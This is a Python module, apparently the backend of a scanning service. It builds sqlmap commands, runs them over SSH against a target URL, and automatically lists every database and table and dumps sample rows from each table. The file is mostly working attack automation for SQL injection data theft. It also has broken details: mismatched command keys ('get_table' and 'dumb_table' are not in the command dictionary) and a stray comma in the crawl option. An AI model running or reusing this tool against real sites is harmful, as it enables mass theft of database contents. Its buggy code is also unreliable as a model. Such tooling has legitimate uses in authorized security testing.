from paramiko.ssh_exception import SSHException
from werkzeug.exceptions import InternalServerError

from app.utils.connection_pool import pool

common_mysql_dbs = ["information_schema", "mysql", "performance_schema"]


def get_command(command_key: str, target: str, database: str = None, table: str = None, column: str = None):
    sqlmap_commands = {

        'get_dbs': f"sqlmap -u {target} --batch --dbs",
        'get-tables': f"sqlmap -u {target} --batch -D {database} --tables",
        'dump-table': f"sqlmap -u {target} --batch  -D {database} -T {table} --dump",
        'dump-column': f"sqlmap -u {target} --batch -D {database} -T {table} -C {column} --dump",
        # Additional
        'form-test': f"sqlmap -u {target} --batch --forms",
        'banner-grab': f"sqlmap -u {target} --batch --banner",
    }

    return sqlmap_commands[command_key]


def add_options(command: str, options: dict):
    '''
    VALUES of options :
    threads: int = None, risk: int = None, level: int = None, tamper=None, ssl: bool = False

    '''

    if options['threads']:
        command += f" --threads={options['threads']}"
    if options['risk']:
        command += f" --risk={options['risk']}"
    if options['level']:
        command += f" --level={options['level']}"
    if options['tamper']:
        command += f" --tamper={','.join(options['tamper'])}"
    if options['crawl']:
        command += f" --crawl={options['crawl']}",
    if options['ssl']:
        command += " --force-ssl"
    if options['delay']:
        command += f" --delay={options['delay']}"

    return command


################################################################
'''                      OUTPUT PARSING                      '''


################################################################


# Retrives info such as DBMS type and list of databases.
def parse_dbs_output(shell_output: str):
    dbms_type: str
    databases = []

    # Split strtings by newline
    split_output = shell_output.split("\n")

    # Strip whitespaces on the begining and end of the string.
    split_output = [item.strip() for item in split_output]

    # Recursive method for finding all DB names outputed by SQLMap tool.
    def find_db_names(item: str):

        next_item = split_output[split_output.index(item) + 1]

        if "[*]" in next_item:
            databases.append(next_item.split(" ")[1])

            find_db_names(next_item)

        else:
            return databases

    for item in split_output:

        # Find DBMS type.
        if "back-end DBMS" in item:
            dbms_type = item.split(" ")
            dbms_type = " ".join(dbms_type[2:])

        # Find DBs
        if "available databases" in item and item is not split_output[-1]:
            find_db_names(item)

    databases = [
        db_name for db_name in databases if db_name not in common_mysql_dbs]

    return databases, dbms_type


# Retrives all table names from a given databse.
def parse_tables_output(shell_output: str):
    tables = []

    # Split strtings by newline
    split_output = shell_output.split("\n")
    # Strip whitespaces on the begining and end of the string.
    split_output = [item.strip() for item in split_output]

    # Recursive method for finding all table names outputed by SQLMap tool.
    def find_table_names(item: str):

        next_item = split_output[split_output.index(item) + 1]
        if '|' in next_item:
            tables.append(next_item.split(" ")[1])
            find_table_names(next_item)
        else:
            return tables

    for item in split_output:
        # Find tables
        if '+' in item and item is not split_output[-1]:
            find_table_names(item)

    tables = list(set(tables))

    return list(tables)


#  Retrives 5 (default) rows of a given db table.
def parse_table_dump_output(shell_output: str, numrows: int = 5):
    rows = []
    first_plus = True

    # Split strtings by newline
    split_output = shell_output.split("\n")
    # Strip whitespaces on the begining and end of the string.
    split_output = [item.strip() for item in split_output]

    # Return first couple of rows from the db table dump.
    for item in split_output:

        if '+' in item and first_plus:

            first_plus = False
            for i in range(1, numrows + 1):

                next_item = split_output[split_output.index(item) + i]
                if '|' == next_item[0]:
                    rows.append(next_item)

    return list(rows)


################################################################
################################################################


# DUMPING ROWS FROM ALL TABLES FOUND IN DBs
def run_tables_dump(target: str, options: dict = None) -> dict:
    retrived_data = {
        "target": f"{target}",
        "dbms_type": "",
        "databases": {},
        "tables": {}
    }

    try:
        # Find all databases
        ssh_client = pool.get_ssh_connection(['sqlmap'])

        if not ssh_client:
            raise InternalServerError('Could not get SSH connection')

        dbs_output = ssh_client.run_command(add_options(
            get_command('get_dbs', target), options))
        dbs, dbms_type = parse_dbs_output(dbs_output)

        # Store found results in report.
        retrived_data["dbms_type"] = dbms_type

        # Search all databases for all tables.
        for db in dbs:

            tables_output = ssh_client.run_command(add_options(get_command('get_table', target, db), options))
            tables_list = parse_tables_output(tables_output)

            # Store found tables to report.
            retrived_data["databases"][db] = tables_list

            for table in tables_list:
                table_dump_output = ssh_client.run_command(get_command('dumb_table', target, db, table))

                rows_dump = parse_table_dump_output(
                    table_dump_output)
                retrived_data["tables"][table] = rows_dump
    except SSHException:
        raise InternalServerError

    return retrived_data
